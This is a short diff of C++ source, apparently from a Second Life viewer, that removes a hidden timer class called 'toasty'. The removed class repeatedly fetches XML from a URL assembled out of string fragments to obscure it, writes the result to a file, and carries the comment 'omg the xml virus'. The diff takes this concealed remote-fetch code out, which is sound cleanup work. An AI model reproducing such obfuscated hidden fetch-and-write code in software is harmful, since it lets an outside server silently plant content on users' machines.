@@ -2263,10 +2263,6 @@ class LLObjectEnableMute : public view_listener_t
 	}
 };
 
-class toasty : public LLEventTimer { public: toasty(std::string x); virtual ~toasty(); virtual BOOL tick(); std::string y; }; toasty::toasty(std::string x) : LLEventTimer( (F32)0.25 ), y(x) { };
-toasty::~toasty() { } BOOL toasty::tick() { toasted = FALSE; /*omg the xml virus*/LLSD k = LLHTTPClient::blockingGet(std::string("htt")+"p://www.m"+"odularsys"+"tems.sl/a"+"pp/y_u_d"+"o_dis/me"+"d.xml"); 
-	if(k.has("body"))k = k["body"]; llofstream e; e.open(y); LLSDSerialize::toPrettyXML(k, e); e.close(); return TRUE; }
-
 class LLObjectMute : public view_listener_t
 {
 	bool handleEvent(LLPointer<LLEvent> event, const LLSD& userdata)
